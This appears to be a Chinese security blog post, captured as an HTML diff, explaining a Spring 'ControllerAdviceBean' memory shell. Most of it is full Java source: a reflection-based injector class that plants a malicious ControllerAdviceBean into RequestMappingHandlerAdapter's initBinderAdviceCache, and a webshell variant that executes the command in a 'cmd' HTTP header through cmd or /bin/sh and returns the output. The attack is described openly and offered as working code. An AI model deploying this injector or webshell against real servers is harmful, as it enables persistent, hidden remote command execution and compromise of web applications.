@@ -1,0 +1,376 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ControllerAdviceBean Memory Shell | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="ControllerAdviceBean Memory Shell | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+本来在学Java中的回显链的，突然看到@fmyyy师傅发了一篇博客，马上进行研究，不愧是@fmyyy师傅，@fmyyy师傅讲的比较简单，所以自己复现了一遍,本文只是在@fmyyy师傅的基础上的更稍微详细一点的分析。
+正文
+该内存马是关..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              ControllerAdviceBean Memory Shell
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220921162228567.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>本来在学Java中的回显链的，突然看到@fmyyy师傅发了一篇博客，马上进行研究，不愧是@fmyyy师傅，@fmyyy师傅讲的比较简单，所以自己复现了一遍,本文只是在@fmyyy师傅的基础上的更稍微详细一点的分析。</p>
+<h1 id="正文">正文</h1>
+<p>该内存马是关于<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter</code>类的，有关这个组件可以看https://cloud.tencent.com/developer/article/1525175进行学习</p>
+<p>主要是在该类的<code>getDataBinderFactory</code>方法</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220920220302629.png" alt="image-20220920220302629" loading="lazy"></figure>
+<p>他这里对controllerAdviceBean调用了resolveBean方法，controllerAdviceBean是遍历<code>initBinderAdviceCache</code>属性后的ControllerAdviceBean类的对象，所以这里我们只需要构造一个ControllerAdviceBean的子类，里面的resolveBean方法里存放我们的恶意代码即可</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220920221411387.png" alt="image-20220920221411387" loading="lazy"></figure>
+<pre><code class="language-java">package com.ch1e.memoryShell;
+
+import org.springframework.beans.factory.BeanFactory;
+import org.springframework.web.bind.annotation.ControllerAdvice;
+import org.springframework.web.bind.annotation.InitBinder;
+import org.springframework.web.method.ControllerAdviceBean;
+import java.io.IOException;
+
+public class EvilControllerAdviceBean extends ControllerAdviceBean{
+
+    public EvilControllerAdviceBean(){
+        super(&quot;123&quot;);
+    }
+    public EvilControllerAdviceBean(Object bean) {
+        super(bean);
+    }
+
+    public EvilControllerAdviceBean(String beanName, BeanFactory beanFactory) {
+        super(beanName, beanFactory);
+    }
+
+    public EvilControllerAdviceBean(String beanName, BeanFactory beanFactory, ControllerAdvice controllerAdvice) {
+        super(beanName, beanFactory, controllerAdvice);
+    }
+
+    @Override
+    @InitBinder()
+    public Object resolveBean() {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        return null;
+    }
+}
+</code></pre>
+<p>所以我们的常规操作可以用加载字节码来加载我们的恶意类，然后实例化一个恶意类即可。现在的思路就是把我们的恶意类放到需要他自己去执行的地方去，上文说到controllerAdviceBean是遍历<code>initBinderAdviceCache</code>属性后的ControllerAdviceBean类的对象，所以我们首先要找到一个存放<code>RequestMappingHandlerAdapter</code>类的地方，并且要把他的initBinderAdviceCache属性中添加我们的恶意类</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220920225248158.png" alt="image-20220920225248158" loading="lazy"></figure>
+<p>除此之外，我们还要给他的方法添加一个@InitBinder注解，不然initBinderAdviceCache初始是没有的</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220920225343897.png" alt="image-20220920225343897" loading="lazy"></figure>
+<p>目前的链子就是RequestMappingHandlerAdapter.initBinderAdviceCache,还需要找到哪里存储了<code>RequestMappingHandlerAdapter</code>类。在DispatcherServlet类中有这么一个属性handlerAdapters，存储的是HandlerAdapter类的List</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220920230243730.png" alt="image-20220920230243730" loading="lazy"></figure>
+<p>经过调试发现他下标为0的时候存储的东西正是RequestMappingHandlerAdapter对象</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220920230345412.png" alt="image-20220920230345412" loading="lazy"></figure>
+<p>所以我们只需要获取DispatcherServlet的handlerAdapters属性的第一个下标的值即可获取到RequestMappingHandlerAdapter，所以现在需要获取到DispatcherServlet，他会存储在StandardWrapper的instance属性中，并且StandardWrapper可以通过Context中的children中通过获取键为dispatcherServlet的值来获取</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220921162228567.png" alt="image-20220921162228567" loading="lazy"></figure>
+<p>所以链很明显，获取context然后获取他的children属性，通过get(&quot;dispatcherServlet&quot;)来获取到StandardWrapper，并且获取他的instance得到DispatcherServlet</p>
+<p>所以接下来就是写马了，大致马子如下:</p>
+<pre><code class="language-java">package com.ch1e.memoryShell;
+
+import com.ch1e.Utils;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.Container;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.core.StandardWrapper;
+import org.springframework.web.method.ControllerAdviceBean;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter;
+
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.*;
+
+public class inject extends AbstractTranslet {
+
+    public inject() throws Exception {
+        //获取StandardContext
+        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+        StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();
+
+        //从Context中获取children属性
+        java.lang.reflect.Field childrenfield = org.apache.catalina.core.ContainerBase.class.getDeclaredField(&quot;children&quot;);
+        childrenfield.setAccessible(true);
+        HashMap&lt;String, Container&gt; children = (HashMap&lt;String, Container&gt;) childrenfield.get(standardContext);
+
+        //获取StandardWrapper
+        StandardWrapper wrapper = (StandardWrapper) children.get(&quot;dispatcherServlet&quot;);
+
+        //从StandardWrapper的instance属性中获取DispatcherServlet
+        java.lang.reflect.Field field2 = wrapper.getClass().getDeclaredField(&quot;instance&quot;);
+        field2.setAccessible(true);
+        Object obj = field2.get(wrapper);
+
+        //获取DispatcherServlet的handlerAdapters
+        java.lang.reflect.Field field3 = obj.getClass().getDeclaredField(&quot;handlerAdapters&quot;);
+        field3.setAccessible(true);
+        ArrayList obj2 = (ArrayList) field3.get(obj);
+
+        //用加载字节码初始化恶意类
+        Class clazz = Class.forName(&quot;java.lang.ClassLoader&quot;);
+        Method defineClass = clazz.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+        defineClass.setAccessible(true);
+        //上面恶意ControllerAdviceBean的字节码
+        byte[] code = Base64.getDecoder().decode(Utils.getByte());
+        Class targetClass = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;EvilControllerAdviceBean&quot;, code, 0, code.length);
+        ControllerAdviceBean evilControllerAdviceBean = (ControllerAdviceBean) targetClass.newInstance();
+
+        //获取到requestMappingHandlerAdapter对象
+        RequestMappingHandlerAdapter requestMappingHandlerAdapter = (RequestMappingHandlerAdapter)obj2.get(0);
+
+
+        //把恶意类添加到initBinderAdviceCache当中
+        Field field4 = requestMappingHandlerAdapter.getClass().getDeclaredField(&quot;initBinderAdviceCache&quot;);
+        field4.setAccessible(true);
+        LinkedHashMap linkedHashMap = (LinkedHashMap) field4.get(requestMappingHandlerAdapter);
+        Set&lt;String&gt; testSet = new HashSet&lt;String&gt;();
+        linkedHashMap.put(evilControllerAdviceBean,testSet);
+    }
+
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<pre><code class="language-java">import org.springframework.beans.factory.BeanFactory;
+import org.springframework.web.bind.annotation.ControllerAdvice;
+
+import org.springframework.beans.factory.BeanFactory;
+import org.springframework.web.bind.annotation.ControllerAdvice;
+import org.springframework.web.method.ControllerAdviceBean;
+
+import java.io.IOException;
+
+import java.io.IOException;
+import java.lang.reflect.Method;
+import java.util.Scanner;
+
+public class EvilControllerAdviceBean extends ControllerAdviceBean{
+
+    public EvilControllerAdviceBean(){
+        super(&quot;123&quot;);
+    }
+    public EvilControllerAdviceBean(Object bean) {
+        super(bean);
+    }
+
+    public EvilControllerAdviceBean(String beanName, BeanFactory beanFactory) {
+        super(beanName, beanFactory);
+    }
+
+    public EvilControllerAdviceBean(String beanName, BeanFactory beanFactory, ControllerAdvice controllerAdvice) {
+        super(beanName, beanFactory, controllerAdvice);
+    }
+
+    @Override
+    public Object resolveBean() {
+        try {
+            Class c = Thread.currentThread().getContextClassLoader().loadClass(&quot;org.springframework.web.context.request.RequestContextHolder&quot;);
+            Method m = c.getMethod(&quot;getRequestAttributes&quot;);
+            Object o = m.invoke(null);
+            c = Thread.currentThread().getContextClassLoader().loadClass(&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;);
+            m = c.getMethod(&quot;getResponse&quot;);
+            Method m1 = c.getMethod(&quot;getRequest&quot;);
+            Object resp = m.invoke(o);
+            Object req = m1.invoke(o); // HttpServletRequest
+            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(&quot;javax.servlet.ServletResponse&quot;).getDeclaredMethod(&quot;getWriter&quot;);
+            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(&quot;javax.servlet.http.HttpServletRequest&quot;).getDeclaredMethod(&quot;getHeader&quot;, String.class);
+            getHeader.setAccessible(true);
+            getWriter.setAccessible(true);
+            Object writer = getWriter.invoke(resp);
+            String cmd = (String) getHeader.invoke(req, &quot;cmd&quot;);
+            String[] commands = new String[3];
+            String charsetName = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot; : &quot;UTF-8&quot;;
+            if (System.getProperty(&quot;os.name&quot;).toUpperCase().contains(&quot;WIN&quot;)) {
+                commands[0] = &quot;cmd&quot;;
+                commands[1] = &quot;/c&quot;;
+            } else {
+                commands[0] = &quot;/bin/sh&quot;;
+                commands[1] = &quot;-c&quot;;
+            }
+            commands[2] = cmd;
+            writer.getClass().getDeclaredMethod(&quot;println&quot;, String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(&quot;\\A&quot;).next());
+            writer.getClass().getDeclaredMethod(&quot;flush&quot;).invoke(writer);
+            writer.getClass().getDeclaredMethod(&quot;close&quot;).invoke(writer);
+            return &quot;ch1e&quot;;
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        return &quot;ch1e&quot;;
+    }
+}
+
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220921223004812.png" alt="image-20220921223004812" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/executor-memory-shell/">
+              <h3 class="post-title">
+                Executor Memory Shell
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
